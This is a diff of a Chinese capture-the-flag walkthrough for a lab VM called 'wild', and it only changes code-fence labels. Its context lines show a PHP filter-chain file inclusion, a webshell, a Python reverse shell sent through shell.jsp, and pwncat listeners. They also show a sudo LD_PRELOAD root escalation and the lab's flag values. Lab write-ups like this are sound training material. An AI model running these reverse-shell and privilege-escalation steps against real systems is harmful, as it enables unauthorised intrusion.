@@ -389,7 +389,7 @@ http://192.168.56.106/recipe.php?file=php://filter/convert.i%2563onv.UTF8.CSISO2
 
 尝试使用 `AntSword` 建立连接，成功连接 webshell，将会话反弹至监听器
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 8888
 [18:20:02] Welcome to pwncat 🐈!
@@ -707,7 +707,7 @@ http://192.168.56.106:8080/tiny-webapp/shell.jsp?cmd=python3+-c+%27import+socket
 
 即可收到回连的 shell
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $pwncat-cs -lp 6666
 [19:31:36] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
@@ -722,7 +722,7 @@ tod
 
 ### flag - user
 
-```shell
+```bash
 (remote) tod@wild.hmv:/home/tod$ cat user.txt
 c1cc7f5179a168ec93095695f20c9e3f
 ```
@@ -756,7 +756,7 @@ void init()
 
 然后编译注入
 
-```shell
+```bash
 (remote) tod@wild.hmv:/home/tod$ nano exia.c
 (remote) tod@wild.hmv:/home/tod$ gcc -shared -fPIC -o exia.so exia.c
 (remote) tod@wild.hmv:/home/tod$ sudo LD_PRELOAD=/home/tod/exia.so /usr/bin/info
@@ -767,7 +767,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@wild:~# cat root.txt
 d8592e5a179d4b80e099f4c9a460c6e4
 ```
